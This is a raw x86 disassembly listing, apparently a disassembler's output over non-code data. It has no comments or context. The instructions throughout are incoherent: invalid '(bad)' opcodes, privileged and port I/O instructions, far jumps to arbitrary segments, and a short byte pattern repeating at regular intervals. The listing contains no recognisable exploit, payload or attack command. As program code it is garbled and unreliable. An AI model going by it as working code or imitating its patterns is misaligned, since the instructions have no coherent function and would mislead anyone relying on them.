  4201cb:	mov    bh,0x99
  4201cd:	loop   0x420236
  4201cf:	xchg   ecx,eax
  4201d0:	inc    edi
  4201d1:	fwait
  4201d2:	sub    ah,BYTE PTR [edi-0x701cacdf]
  4201d8:	(bad)
  4201dd:	sub    ebp,eax
  4201df:	pop    ecx
  4201e0:	pop    ss
  4201e1:	and    BYTE PTR [ebx],cl
  4201e3:	mov    edi,0x433ee84b
  4201e8:	clc    
  4201e9:	bsf    ebp,DWORD PTR [ebx+0x93f4]
	...
  420254:	add    BYTE PTR [eax],al
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x3396fbe],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	mov    ecx,0xfd4161b1
  420273:	xchg   esp,eax
  420274:	push   eax
  420275:	mov    al,ds:0xb3f3975f
  42027a:	outs   dx,BYTE PTR ds:[esi]
  42027b:	push   esp
  42027c:	and    ebx,DWORD PTR [ebp-0x49]
  42027f:	mov    eax,ds:0xddbef583
  420284:	cmp    al,0xb1
  420286:	or     DWORD PTR [ebp+0x398de94],edx
  42028c:	xor    bl,BYTE PTR [esi-0x6fd706db]
  420292:	sahf   
  420293:	push   ecx
  420294:	sahf   
  420295:	fwait
  420296:	add    al,0xf7
  420298:	icebp  
  420299:	popa   
  42029a:	add    bh,dl
  42029c:	pop    esi
  42029d:	sbb    al,cl
  42029f:	out    0x14,eax
  4202a1:	push   eax
  4202a2:	sbb    esp,DWORD PTR [edx-0x1c]
  4202a5:	retf   0xaf16
  4202a8:	icebp  
  4202a9:	xor    DWORD PTR [esi-0x6f],ecx
  4202ac:	mov    ds:0x428c8dcc,eax
  4202b1:	push   ebp
  4202b2:	pop    esp
  4202b3:	lock fsub st(4),st
  4202b6:	cli    
  4202b7:	arpl   WORD PTR [ebx+ecx*8+0x25],dx
  4202bb:	(bad)  
  4202bc:	hlt    
  4202bd:	or     esi,DWORD PTR [eax]
  4202bf:	mov    dh,0x6a
  4202c1:	dec    ebx
  4202c2:	or     ebx,DWORD PTR [ecx+eiz*4+0x2a]
  4202c6:	mov    esi,0x88fe9828
  4202cb:	ins    DWORD PTR es:[edi],dx
  4202cc:	pop    eax
  4202cd:	jmp    0xa5dfdc3b
  4202d2:	out    0x64,al
  4202d4:	icebp  
  4202d5:	lock cld 
  4202d7:	into   
  4202d8:	in     al,dx
  4202d9:	cld    
  4202da:	aad    0x5e
  4202dc:	sbb    ch,BYTE PTR [edx+0x4233e9bb]
  4202e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202e3:	int    0x38
  4202e5:	or     eax,0x89f561b1
  4202ea:	iret   
  4202eb:	mov    ebp,0xa4092d52
  4202f0:	and    BYTE PTR [ecx-0xcd6d992],bl
  4202f6:	nop
  4202f7:	push   ecx
  4202f8:	in     al,dx
  4202f9:	mov    al,ds:0x50a2e441
  4202fe:	mov    ds,WORD PTR [ebp-0x69d60650]
  420304:	aaa    
  420305:	pop    ebx
  420306:	loope  0x420336
  420308:	nop
  420309:	adc    DWORD PTR [ebx-0x5f691420],ebx
  42030f:	jne    0x420340
  420311:	mov    ah,0x24
  420313:	mov    bh,0xc7
  420315:	push   eax
  420316:	add    bl,BYTE PTR [eax+ebp*4]
  420319:	mov    esi,0xdefdc0bd
  42031e:	aam    0x6
  420320:	les    ecx,FWORD PTR [eax+0x7a]
  420323:	test   DWORD PTR [ecx-0x52],esp
  420326:	add    DWORD PTR [ebx],ebx
  420328:	aaa    
  420329:	scas   al,BYTE PTR es:[edi]
  42032a:	nop
  42032b:	loop   0x420336
  42032d:	outs   dx,BYTE PTR ds:[esi]
  42032e:	and    DWORD PTR [edi+0x2a],edi
  420331:	cli    
  420332:	jp     0x420398
  420334:	mov    al,ds:0xa8b9f700
  420339:	mov    bl,0x84
  42033b:	xchg   DWORD PTR [ecx+eax*2],eax
  42033e:	inc    edx
  42033f:	jecxz  0x42030c
  420341:	inc    ebx
  420342:	jmp    0x2aeb:0x8de92876
  420349:	sar    ch,0xba
  42034c:	rol    BYTE PTR [ebp+0x4448cd19],0x57
  420353:	push   ds
  420354:	(bad)  
  420355:	pop    edi
  420356:	loop   0x420382
  420358:	je     0x4203ba
  42035a:	add    BYTE PTR [ecx-0x7248ca48],bh
  420360:	test   eax,0xd8bec554
  420365:	lods   al,BYTE PTR ds:[esi]
  420366:	fimul  DWORD PTR [ebx-0x5bc21a0b]
  42036c:	lahf   
  42036d:	pop    es
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	jl     0x42037f
  4203e4:	addr16 popa 
  4203e6:	addr16 pop edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	sbb    eax,0xc196a631
  4203f3:	jle    0x4203df
  4203f5:	push   es
  4203f6:	(bad)  
  4203f7:	popa   
  4203f8:	ja     0x4203eb
  4203fa:	out    0x19,al
  4203fc:	cdq    
  4203fd:	jns    0x420432
  4203ff:	repnz (bad) 
  420401:	lea    ebp,[edx]
  420403:	cdq    
  420404:	add    dh,BYTE PTR [edx]
  420406:	mov    bh,0xbc
  420408:	cli    
  420409:	ja     0x420481
  42040b:	push   esp
  42040d:	retf   0xd47d
  420410:	dec    eax
  420411:	mov    al,ds:0x1044be9e
  420416:	retf   0x6ef8
  420419:	lods   al,BYTE PTR ds:[esi]
  42041a:	jle    0x4203d5
  42041c:	cmp    BYTE PTR [edx+0x430a1c4b],bh
  420422:	push   0x11
  420424:	je     0x42045c
  420426:	cmp    al,0x3c
  420428:	xor    esp,edx
  42042a:	mov    al,bh
  42042c:	sub    DWORD PTR [edi+0x67a7ad77],edx
  420432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420433:	repnz cmp DWORD PTR [eax+edx*8-0x1d990cb5],eax
  42043b:	adc    esi,ebp
  42043d:	iret   
  42043e:	jmp    0x4203c8
  420440:	add    ecx,DWORD PTR [eax]
  420442:	cmp    ch,BYTE PTR [esi-0x451333e8]
  420448:	fsub   QWORD PTR [esi+0x3e]
  42044b:	pop    esp
  42044c:	mov    edi,0x8ed05e86
  420451:	and    DWORD PTR [esi],esi
  420453:	mov    ebx,0xa669b4f9
  420458:	mov    ebx,0x481b7304
  42045d:	mov    dh,0xb3
  42045f:	aaa    
  420460:	fwait
  420461:	or     DWORD PTR [edx-0x7a],ebx
  420464:	xchg   edx,eax
  420465:	dec    ebp
  420466:	test   BYTE PTR [edx-0x5cafcddb],dh
  42046c:	sub    eax,0x562867d4
  420471:	ret    
  420472:	out    dx,eax
  420473:	sub    edi,DWORD PTR [esi-0x2c4c10d]
  420479:	pop    edi
  42047a:	(bad)  
  42047b:	and    ch,bl
  42047d:	imul   ecx,DWORD PTR [ebx-0x58581d],0xe208b15
  420487:	xchg   edx,eax
  420488:	aam    0xe6
  42048a:	adc    eax,DWORD PTR [edx-0x27]
  42048d:	sbb    BYTE PTR [ecx],cl
  42048f:	test   al,0xbe
  420491:	(bad)  [ebp+0x5e9b097b]
  420497:	jle    0x420471
  420499:	shr    DWORD PTR [ebp-0x2c4a9ff6],0x5a
  4204a0:	pop    esp
  4204a1:	jmp    0x59f71913
  4204a6:	jns    0x420468
  4204a8:	fild   QWORD PTR [ebx-0x1303e561]
  4204ae:	adc    DWORD PTR [ecx],0x5a
  4204b1:	enter  0xa043,0x21
  4204b5:	sbb    edx,esp
  4204b7:	stos   DWORD PTR es:[edi],eax
  4204b8:	out    dx,eax
  4204b9:	cwde   
  4204ba:	(bad)  
  4204bb:	popf   
  4204bc:	ja     0x42046e
  4204be:	aam    0xf5
  4204c0:	mov    eax,gs:0xf51a8361
  4204c6:	ds pop es
  4204c8:	repnz sub eax,0xdf6a7d54
  4204ce:	inc    eax
  4204cf:	retf   
  4204d0:	adc    dh,BYTE PTR ds:0xf2789c58
  4204d6:	xor    ecx,DWORD PTR [ecx+0xf]
  4204d9:	sbb    eax,0x890aadc3
  4204de:	sbb    edx,DWORD PTR [edx-0x28]
  4204e1:	outs   dx,DWORD PTR ds:[esi]
  4204e2:	mov    ecx,edi
  4204e4:	ret    
  4204e5:	call   0xc9e8:0xa607ff97
  4204ec:	rcl    DWORD PTR [ebx+0x0],cl
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	adc    eax,DWORD PTR [eax-0x44]
  420565:	jmp    0x4360d1
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	dec    ebx
  42056f:	sub    bl,BYTE PTR [edx*2-0x54bb5cdb]
  420576:	xchg   ecx,eax
  420577:	xchg   edi,eax
  420578:	xor    ebp,ebx
  42057a:	outs   dx,DWORD PTR ds:[esi]
  42057b:	es inc edi
  42057d:	xor    edi,DWORD PTR [eax+0x3]
  420580:	sahf   
  420581:	sub    DWORD PTR [edi+0x5e22375d],edi
  420587:	pop    esp
  420588:	push   0xffffffd9
  42058a:	shl    DWORD PTR [ebx-0x55],1
  42058d:	lahf   
  42058e:	sbb    DWORD PTR [ebp+0x58bb1224],esi
  420594:	retf   0xe12b
  420597:	mov    ds:0x17888484,al
  42059c:	sbb    eax,0x9648ef48
  4205a1:	fadd   QWORD PTR [esp+esi*1+0x28cf7a71]
  4205a8:	(bad)
  4205ac:	push   esi
  4205ad:	es (bad) 
  4205b0:	retf   0x339d
  4205b3:	xor    dl,BYTE PTR [edx+0x7edd84ac]
  4205b9:	repz inc esi
  4205bb:	int    0xac
  4205bd:	cmp    DWORD PTR [edi-0x4a],0x53
  4205c1:	or     eax,0xd624cf29
  4205c6:	jle    0x42061e
  4205c8:	sub    BYTE PTR [edx-0x74b036a2],bh
  4205ce:	js     0x420617
  4205d0:	nop
  4205d1:	sahf   
  4205d2:	mov    bl,0xcb
  4205d4:	xor    al,0xa6
  4205d6:	inc    edi
  4205d7:	inc    ebx
  4205d8:	in     eax,0x48
  4205da:	dec    ecx
  4205db:	loop   0x42061d
  4205dd:	or     al,0xfa
  4205df:	scas   eax,DWORD PTR es:[edi]
  4205e0:	retf   0x390
  4205e3:	stos   DWORD PTR es:[edi],eax
  4205e4:	or     ebx,DWORD PTR [ecx-0x4ce99827]
  4205ea:	or     BYTE PTR [eax-0x70],cl
  4205ed:	fwait
  4205ee:	cmp    dh,0x47
  4205f1:	jbe    0x4205b1
  4205f3:	mov    dl,0x92
  4205f5:	pop    esi
  4205f6:	cmp    al,0x12
  4205f8:	inc    esi
  4205f9:	adc    eax,0xd101ef24
  4205fe:	cmp    bh,al
  420600:	cmp    eax,0x71223cc5
  420605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420606:	mov    al,dh
  420608:	ins    BYTE PTR es:[edi],dx
  420609:	pop    esi
  42060a:	enter  0x62fa,0xe8
  42060e:	mov    eax,0x30ada215
  420613:	mov    ecx,DWORD PTR [eax-0x7f]
  420616:	daa    
  420617:	xchg   bl,bl
  420619:	(bad)  
  42061a:	and    al,0xce
  42061c:	and    al,0x30
  42061e:	sti    
  42061f:	call   0xa8f5:0xca2708cc
  420626:	in     al,dx
  420627:	cmc    
  420628:	(bad)  
  420629:	cmp    BYTE PTR [edi-0x3a],dh
  42062c:	dec    ecx
  42062d:	push   esi
  42062e:	pop    es
  42062f:	adc    dh,bl
  420631:	mov    ebp,0x81b61bd
  420636:	imul   eax,DWORD PTR [esi-0x4c2e7389],0xf0c74698
  420640:	ins    DWORD PTR es:[edi],dx
  420641:	xor    DWORD PTR [edi+edx*8+0x1e],0x6918bd57
  420649:	iret   
  42064a:	out    dx,eax
  42064b:	leave  
  42064c:	inc    eax
  42064d:	gs (bad) 
  420651:	cs ins BYTE PTR es:[edi],dx
  420653:	scas   al,BYTE PTR es:[edi]
  420654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420655:	or     DWORD PTR [eax],0x7cc567c6
  42065b:	push   ds
  42065c:	jmp    0x75c2:0xa9e3de87
  420663:	push   ds
  420664:	stc    
  420665:	out    dx,eax
  420666:	fs ss jbe 0x4206b4
  42066a:	or     BYTE PTR [edx],0x5f
  42066d:	xchg   esi,eax
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	std    
  4206e3:	xor    al,0x2c
  4206e5:	into   
  4206e6:	addr16 pop esp
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	add    ch,dh
  4206f0:	sbb    eax,0xa29e47be
  4206f5:	jp     0x42069c
  4206f7:	adc    al,0x2b
  4206f9:	in     al,dx
  4206fa:	xor    eax,0x89d1076c
  4206ff:	dec    edi
  420700:	or     dl,BYTE PTR [ecx+0x7b]
  420703:	jo     0x420777
  420705:	shl    eax,cl
  420707:	ja     0x420709
  420709:	jl     0x420778
  42070b:	ds xchg edx,eax
  42070d:	mov    ch,0xaf
  42070f:	add    al,0xb5
  420711:	inc    edi
  420712:	call   0x881e3447
  420717:	outs   dx,DWORD PTR ds:[esi]
  420718:	test   eax,0x685db8da
  42071d:	pop    ebp
  42071e:	xor    DWORD PTR ds:[ebp-0x6d],0x1b
  420723:	jle    0x420760
  420725:	mov    edx,edx
  420727:	leave  
  420728:	mov    esi,0x7fe70b55
  42072d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42072e:	fisttp DWORD PTR ds:[edx-0x3748e747]
  420735:	cmp    BYTE PTR [edx+eiz*4+0x246a224b],dl
  42073c:	les    edx,FWORD PTR [edi-0x4]
  42073f:	sbb    eax,0x8499ce61
  420744:	add    DWORD PTR ds:0x46417e4a,esi
  42074a:	xor    al,0xee
  42074c:	lock sbb si,WORD PTR [edx]
  420750:	popf   
  420751:	fnsave [edx-0x6c]
  420754:	enter  0xfccb,0x20
  420758:	dec    edx
  420759:	adc    edx,ebx
  42075b:	stos   BYTE PTR es:[edi],al
  42075c:	xchg   edx,eax
  42075d:	mov    al,ds:0x9e3341ed
  420762:	push   ebx
  420763:	xchg   ebp,eax
  420764:	dec    eax
  420765:	inc    ebx
  420766:	mov    ds:0x4d2c398e,eax
  42076b:	js     0x420714
  42076d:	das    
  42076e:	ja     0x420784
  420770:	scas   al,BYTE PTR es:[edi]
  420771:	push   ss
  420772:	jne    0x42078d
  420774:	sar    DWORD PTR [edi+0x3a169e6f],0x4a
  42077b:	pop    esi
  42077c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42077d:	ss mov esp,0xda076e38
  420783:	inc    eax
  420784:	imul   esp,DWORD PTR [esi+0x28bd2399],0xceadfaf6
  42078e:	xchg   BYTE PTR [edi-0x27],ch
  420791:	add    bl,BYTE PTR [ebx+0x10]
  420794:	sbb    al,0xea
  420796:	push   eax
  420797:	je     0x4207bf
  420799:	inc    esp
  42079a:	cli    
  42079b:	or     DWORD PTR [esi-0x29],ecx
  42079e:	(bad)  
  42079f:	ss pop edi
  4207a1:	loopne 0x42080f
  4207a3:	lods   al,BYTE PTR ds:[esi]
  4207a4:	push   esp
  4207a5:	std    
  4207a6:	shr    BYTE PTR ds:0x64794d80,1
  4207ac:	(bad)  
  4207ae:	xchg   BYTE PTR [edi-0x5bbc9e4a],ch
  4207b4:	fmul   DWORD PTR [esi+0x3e]
  4207b7:	sbb    BYTE PTR [eax-0x5c],ch
  4207ba:	push   ss
  4207bb:	mov    eax,0x696dcc2a
  4207c0:	mov    ds:0xeacdd46d,al
  4207c5:	(bad)  
  4207c6:	std    
  4207c7:	clc    
  4207c8:	add    ebp,eax
  4207ca:	mov    ecx,0x6027748d
  4207cf:	add    ah,BYTE PTR [edi]
  4207d1:	pop    ecx
  4207d2:	sub    esp,esi
  4207d4:	mov    al,ds:0x7e7154b5
  4207d9:	and    eax,0x548570e7
  4207de:	push   cs
  4207df:	mov    ecx,0xc144380f
  4207e4:	and    dh,bl
  4207e6:	push   ebp
  4207e7:	imul   edi,DWORD PTR [ebx+0x9],0xffffffbc
  4207eb:	mov    ss,WORD PTR [eax]
  4207ed:	sbb    eax,DWORD PTR [eax]
	...
  420853:	add    BYTE PTR [eax],al
  420855:	add    BYTE PTR [ecx-0x587fdad1],cl
  42085b:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  420861:	pusha  
  420862:	(bad)  
  420863:	out    dx,al
  420864:	sti    
  420865:	int    0x67
  420867:	pop    ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	sti    
  42086f:	mov    ecx,0x8974e731
  420874:	lds    ebp,FWORD PTR [esi+0x60]
  420877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420878:	retf   0x5591
  42087b:	aas    
  42087c:	xor    BYTE PTR [ebx-0x1c840c5d],dl
  420882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420883:	call   0xbc5e:0x7f2563da
  42088a:	sub    BYTE PTR [esi-0x1c],0x1f
  42088e:	adc    DWORD PTR [eax-0x4c],ebp
  420891:	cmp    DWORD PTR [ecx],ebp
  420893:	sbb    DWORD PTR [ebx-0x73],ebx
  420896:	sub    al,0xd2
  420898:	mov    BYTE PTR [ebp-0x4a03a679],al
  42089e:	push   ebx
  42089f:	xchg   esp,eax
  4208a0:	inc    ebx
  4208a1:	dec    edx
  4208a2:	mov    esp,0xf78eb002
  4208a7:	cmp    ebp,DWORD PTR ds:0x9e079c3d
  4208ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ae:	adc    al,BYTE PTR [edi-0x7ebc996e]
  4208b4:	(bad)  
  4208b5:	jbe    0x420912
  4208b7:	jg     0x4208ae
  4208b9:	pop    esi
  4208ba:	aad    0xdc
  4208bc:	stos   BYTE PTR es:[edi],al
  4208bd:	call   0xfca4878
  4208c2:	xor    al,0x9
  4208c5:	jns    0x4208be
  4208c7:	into   
  4208c8:	mov    esi,0x757c4764
  4208cd:	xchg   ecx,eax
  4208ce:	mov    dl,0x4
  4208d0:	cs je  0x420886
  4208d3:	pushf  
  4208d4:	dec    edx
  4208d5:	loop   0x4208af
  4208d7:	cmp    eax,0x2fd1fc6
  4208dc:	mov    eax,ds:0x36914e71
  4208e1:	js     0x42089b
  4208e3:	sub    esi,DWORD PTR [ebx+0x7abba0ff]
  4208e9:	fsubrp st(7),st
  4208eb:	or     eax,esi
  4208ed:	add    DWORD PTR [edx],esi
  4208ef:	out    dx,eax
  4208f0:	jbe    0x420875
  4208f2:	push   ds
  4208f3:	repz fpatan 
  4208f6:	jl     0x420946
  4208f8:	popa   
  4208f9:	mov    esp,0x6a532c6e
  4208fe:	mov    ds:0x6dbca3db,al
  420903:	cli    
  420904:	xchg   esp,eax
  420905:	in     eax,0x60
  420907:	jae    0x4208f8
  420909:	js     0x420894
  42090b:	call   0xb5056975
  420910:	add    al,0xb6
  420912:	lock (bad) 
  420914:	lds    ebp,FWORD PTR [esi-0x277c9a86]
  42091a:	clc    
  42091b:	and    BYTE PTR [edx],0xe5
  42091e:	xor    ebp,DWORD PTR [esi]
  420920:	outs   dx,DWORD PTR ds:[esi]
  420921:	in     eax,dx
  420922:	mov    bl,0xcc
  420924:	ret    
  420925:	adc    BYTE PTR [edi+edi*8+0x3adcf1fe],ah
  42092c:	mov    esi,DWORD PTR [eax]
  42092e:	(bad)  
  420930:	cli    
  420931:	and    al,0xe8
  420933:	mov    esi,0x5a6e333b
  420938:	ins    DWORD PTR es:[edi],dx
  420939:	push   0xe578d219
  42093e:	retf   
  42093f:	xor    eax,0xe358093a
  420944:	rcr    esi,1
  420946:	push   0x16232811
  42094b:	popa   
  42094c:	xor    eax,0x7929a5d
  420951:	xchg   ecx,eax
  420952:	inc    ebx
  420953:	push   edi
  420954:	imul   esp,DWORD PTR [ebx-0x13f2d5f6],0xffffffd1
  42095b:	repz dec ebx
  42095d:	xor    al,0xb
  42095f:	repnz out dx,eax
  420961:	push   edi
  420962:	icebp  
  420963:	jle    0x420983
  420965:	dec    esi
  420966:	in     eax,0x2a
  420968:	pop    ebx
  420969:	bound  ecx,QWORD PTR [ebx]
  42096b:	mov    ebx,0x41b6
	...
  4209d4:	add    BYTE PTR [eax],al
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x49
  4209e3:	je     0x4209dd
  4209e5:	mov    al,0x67
  4209e7:	pop    esi
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	aam    0x15
  4209f0:	inc    edi
  4209f1:	into   
  4209f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f3:	mov    ds:0xcdf28556,al
  4209f8:	ret    0x1339
  4209fb:	vmulps ymm2,ymm4,ymm5
  4209ff:	test   eax,0x573fbb4f
  420a04:	push   es
  420a05:	mov    esi,0xc70ecf29
  420a0a:	add    al,0x99
  420a0c:	sahf   
  420a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a0e:	mov    ds:0x712acac7,eax
  420a13:	scas   eax,DWORD PTR es:[edi]
  420a14:	xchg   esp,eax
  420a15:	imul   esi,DWORD PTR [ebx],0xfffffffd
  420a18:	jbe    0x420a88
  420a1a:	sbb    ecx,DWORD PTR ds:[ebx-0x7e]
  420a1e:	mov    ds:0xac576597,al
  420a23:	out    dx,al
  420a24:	nop
  420a25:	fst    QWORD PTR [ebx]
  420a27:	add    cl,BYTE PTR [edi-0x79e29ab6]
  420a2d:	sub    eax,0x2bb0cb4a
  420a32:	mov    ah,0x85
  420a34:	aad    0x52
  420a36:	adc    al,ah
  420a38:	xchg   ebx,eax
  420a39:	imul   ecx,DWORD PTR [esi+0x2b],0xfffffff2
  420a3d:	out    0x8c,eax
  420a3f:	inc    ebp
  420a40:	sub    ch,BYTE PTR [edi]
  420a42:	mov    esp,0xb13f74f3
  420a47:	or     al,0xe5
  420a49:	jecxz  0x420a8d
  420a4b:	js     0x420a19
  420a4d:	add    eax,0x80f924f8
  420a52:	sbb    ecx,esp
  420a54:	xchg   edi,eax
  420a55:	push   ebp
  420a56:	ds mov eax,0x6682ccf7
  420a5c:	mov    dh,0xd9
  420a5e:	inc    edx
  420a5f:	sahf   
  420a60:	xchg   ebx,eax
  420a61:	das    
  420a62:	fucomp st(0)
  420a64:	add    al,0x70
  420a66:	test   al,0x75
  420a68:	clc    
  420a69:	or     ebp,ecx
  420a6b:	ss dec edi
  420a6d:	pop    ebp
  420a6e:	dec    esp
  420a6f:	shl    ebp,1
  420a71:	fiadd  DWORD PTR [edx]
  420a73:	cmp    eax,0x896c051d
  420a78:	xor    BYTE PTR [ebp+edi*8+0x39],0x99
  420a7d:	idiv   BYTE PTR [ebx*2+0x1ebbc6e0]
  420a84:	adc    al,0x16
  420a86:	int3   
  420a87:	(bad)  
  420a88:	jge    0x420aa6
  420a8a:	add    al,ah
  420a8c:	xor    DWORD PTR [edi],ecx
  420a8e:	out    dx,eax
  420a8f:	inc    edi
  420a90:	rcr    DWORD PTR [edi-0x4df3d8e0],1
  420a96:	xchg   DWORD PTR [esi+0x7a74db33],ecx
  420a9c:	xchg   esp,eax
  420a9d:	cmovs  eax,DWORD PTR [edi]
  420aa0:	add    cl,BYTE PTR [edx-0x4]
  420aa3:	inc    ebp
  420aa4:	pop    ebx
  420aa5:	cs push eax
  420aa7:	sahf   
  420aa8:	mov    edi,ecx
  420aaa:	test   eax,0xe10f7c17
  420aaf:	nop
  420ab0:	dec    eax
  420ab1:	mov    BYTE PTR [esi-0x5],bl
  420ab4:	fnsave [ebp+0x4a]
  420ab7:	arpl   ax,ax
  420ab9:	add    BYTE PTR [edi-0x2baf72fb],al
  420abf:	fdiv   DWORD PTR [edi+0x17]
  420ac2:	nop
  420ac3:	gs mov cl,0xb6
  420ac6:	addr16 sub ecx,edx
  420ac9:	sbb    ecx,DWORD PTR [esi-0x6d249ada]
  420acf:	cmp    DWORD PTR [edx-0x7209cb05],0xb2d332ab
  420ad9:	mov    DWORD PTR [ecx-0x29],0x7572c433
  420ae0:	mov    WORD PTR [esi+0x12],cs
  420ae3:	or     al,BYTE PTR [eax+0x5f2a437f]
  420ae9:	mov    esp,0xdaabd814
	...
  420b56:	fbstp  TBYTE PTR [edx]
  420b58:	scas   eax,DWORD PTR es:[edi]
  420b59:	adc    ebp,edi
  420b5b:	lahf   
  420b5c:	(bad)  
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	mov    ecx,0x676994f6
  420b67:	pop    edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	xlat   BYTE PTR ds:[ebx]
  420b6f:	and    dl,BYTE PTR [esi+0x2e6230b9]
  420b75:	shl    BYTE PTR [esp+eiz*4-0x30],1
  420b79:	dec    edi
  420b7a:	mov    edx,DWORD PTR [eax]
  420b7c:	pop    ecx
  420b7d:	fwait
  420b7e:	out    0xf9,al
  420b80:	retf   
  420b81:	xor    BYTE PTR [eax+0x62f3ae9a],0xf6
  420b88:	mov    esi,0xa187376c
  420b8d:	or     dl,BYTE PTR [edi]
  420b8f:	jb     0x420bd3
  420b91:	out    0xee,al
  420b93:	(bad)  
  420b94:	cmc    
  420b95:	sbb    al,0xf6
  420b97:	jl     0x420b84
  420b99:	data16 jnp 0x420b8c
  420b9c:	stos   BYTE PTR es:[edi],al
  420b9d:	(bad)  
  420b9e:	dec    edi
  420b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba0:	cli    
  420ba1:	sbb    ah,cl
  420ba3:	call   0x8ac6:0xaf2bda28
  420baa:	or     eax,0xd7985543
  420baf:	push   ds
  420bb0:	ins    DWORD PTR es:[edi],dx
  420bb1:	cdq    
  420bb2:	(bad)  
  420bb3:	std    
  420bb4:	push   eax
  420bb5:	dec    esp
  420bb6:	inc    eax
  420bb7:	dec    esi
  420bb8:	push   ss
  420bb9:	push   cs
  420bba:	and    eax,0x9885bcad
  420bbf:	xor    BYTE PTR [edi],bh
  420bc1:	dec    eax
  420bc2:	je     0x420c12
  420bc4:	or     DWORD PTR ds:0x2265b6b8,ebp
  420bca:	and    dh,cl
  420bcc:	sar    DWORD PTR [ebx-0x6547d89a],0x5e
  420bd3:	add    eax,0xdc268355
  420bd8:	daa    
  420bd9:	lea    esp,[edx+0x28dc3592]
  420bdf:	xchg   ebp,eax
  420be0:	mov    eax,DWORD PTR [ebx+ecx*2+0x6e80ef50]
  420be7:	cld    
  420be8:	adc    eax,0xe1320ddd
  420bed:	and    eax,0xb8bc7d68
  420bf2:	out    0x8f,al
  420bf4:	std    
  420bf5:	dec    ecx
  420bf6:	adc    ch,BYTE PTR [edx-0x2a]
  420bf9:	adc    DWORD PTR [eax+0x7e],ebp
  420bfc:	ss stos DWORD PTR es:[edi],eax
  420bfe:	and    bl,dl
  420c00:	imul   eax,DWORD PTR [ecx+0x74b55612],0xdac40337
  420c0a:	leave  
  420c0b:	mov    al,0x4a
  420c0d:	(bad)  
  420c0e:	mov    DWORD PTR ds:0x55ca6e9a,0xfc17c26a
  420c18:	shl    DWORD PTR [esi],cl
  420c1a:	sbb    DWORD PTR [ebx-0x62],ecx
  420c1d:	pop    edi
  420c1e:	call   0xf1b51318
  420c23:	out    0x4a,al
  420c25:	stc    
  420c26:	fisttp DWORD PTR [edx]
  420c28:	and    bh,0x0
  420c2b:	loope  0x420c6c
  420c2d:	and    BYTE PTR [edi],bh
  420c2f:	or     DWORD PTR [edi],eax
  420c31:	mov    bl,0x5
  420c33:	outs   dx,DWORD PTR ds:[esi]
  420c34:	cld    
  420c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c36:	push   ds
  420c37:	push   0xffffffb4
  420c39:	jns    0x420ca8
  420c3b:	int3   
  420c3c:	(bad)  
  420c3d:	mov    ecx,0x4e3c0cef
  420c42:	push   0xfffffff5
  420c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c45:	and    al,0xfe
  420c47:	add    al,0x93
  420c49:	pop    edi
  420c4a:	enter  0x2406,0xc5
  420c4e:	xor    esp,DWORD PTR [ebx]
  420c50:	xor    eax,0x122b6e1b
  420c55:	popa   
  420c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c57:	hlt    
  420c58:	std    
  420c59:	loopne 0x420c7a
  420c5b:	mov    edx,0x7759b532
  420c60:	lea    ecx,[ebx-0x7a]
  420c63:	inc    edx
  420c64:	jge    0x420c1b
  420c66:	mov    dh,0x28
  420c68:	and    eax,edx
  420c6a:	lods   al,BYTE PTR ds:[esi]
  420c6b:	dec    ecx
  420c6c:	jo     0x420ce2
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0x39
  420ce3:	lahf   
  420ce4:	xchg   ebx,eax
  420ce5:	into   
